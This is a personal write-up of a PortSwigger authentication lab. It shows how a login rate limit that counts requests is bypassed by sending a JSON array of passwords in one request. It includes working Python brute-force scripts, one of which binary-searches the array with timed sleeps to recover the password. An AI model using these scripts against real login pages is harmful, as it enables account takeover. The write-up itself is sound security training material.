~# Broken brute-force protection, multiple credentials per request

**Category:** Web Exploitation — Authentication
**Difficulty:** Expert
**Progress:** Solved

---

## Description

**Lab URL:** `https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request`


This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos's password, then access his account page.

---

## Reconnaissance

- What does the application do? 
    - The website is a blog about several, seemingly to tech related topics. Users can read and leave comments under blog articles.
- Where is user input accepted? (forms, URL parameters, headers, cookies)
    - There is an account page with a login, the comments below articles can be consideres input too.
- What happens with normal input?
    - Correct user logins log the user in normally

---

## Analysis


#### Vulnerability

- What exactly is vulnerable and why?
    
The response / its handling is vulnerable. The application counts requests but not logins and it is possible to input an array for "password" instead of a simple string, thus easily bruteforcing the password.

---

## Solution 

### Step 1 - Recon / Looking at responses

Sending responses manually shows that the brute-force protection allows 3 tries before locking down.
Looking at the request this time it looks different:
```
POST /login HTTP/2
Host: 0a8700460373b16c81b2cfb7004500b6.web-security-academy.net
Cookie: session=5uICbIBRV9nQO3fTuCPgIDKX61TWpbbD
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:157.0) Gecko/20100101 Firefox/157.0
Accept: */*
Accept-Language: de,en-US;q=0.9,en;q=0.8
Accept-Encoding: gzip, deflate, br
Referer: https://0a8700460373b16c81b2cfb7004500b6.web-security-academy.net/login
Content-Type: application/json
Content-Length: 36
Origin: https://0a8700460373b16c81b2cfb7004500b6.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{"username":"sdf","password":"asdd"}

```
Before this lab the login data was always just sent as 'username=admin&password=123456789' in the body of the request. The name suggest we can just send multiple passwords.
Doing it manually reveals no weird response which I take as a good sign.


---

### Step 2 - Enumeration / Step 3 - Exploit

I built a python script that just sends the whole list of passwords as a json, since `Content-Type: application/json` shows us json is needed.
```python
import requests


url = """https://0a8700460373b16c81b2cfb7004500b6.web-security-academy.net/login"""

JSON={"username":"carlos"}
with open('authentication_lab_passwords.txt') as f:
    passwords = [line.strip() for line in f]
    JSON["password"] =  passwords

r = requests.post(url, json=JSON)
print(r.text)
```

And indeed the lab is solved already.
I thought of using binary search recursively (which I think is a genuinely good idea) to get the actual password but the rate limit also defeats that of course. I could maybe do it with a sleep of one minute after every 3 requests. Took a lot of effor to get it right (more than I'd like to admit).
But here it is: a working python binary to also get the actual password

```python
import requests
import time

url = """https://0aae00fe0468d0d880e1677700b70059.web-security-academy.net/login"""

JSON={"username":"carlos"}
with open('authentication_lab_passwords.txt') as f:
    passwords = [line.strip() for line in f]

counter = 0
def binarysearch(arr):
    global counter
    counter+=1
    if counter%3==0:
        print("sleep...")
        time.sleep(60)
    if len(arr) == 1:
        JSON["password"] = arr
        r = requests.post(url, json=JSON)
        if not "Invalid username" in r.text:
            print(arr)
            return True
        else:
            return False
        
    passwords_new = arr[0:len(arr)//2]

    JSON["password"] =  passwords_new
    r = requests.post(url, json=JSON)
  
    if not "Invalid username" in r.text:
        return(binarysearch(arr[0:len(arr)//2]))
        
    else:
        return(binarysearch(arr[len(arr)//2:len(arr)]))
```

---
## Real World Impact

The rate limit is counting the wrong thing. It counts requests not logins. Using a JSON-Array completely defeats it. That means the defenders also just see low traffic from this request. The attacker is invisible. In other words: the counter of the defending measure (requests) is different from the counter of the actual risk (logins).


---
## Learnings
- Content-Type: application/json -> test if array instead of string input is allowed. 
- binary search reduces requests to find the password to log2N. But the Oracle has to be implemented well - stay with the signal as close as possible (I lost so much time using oracle that shows "Congratulations" instead of "Invalid Username")

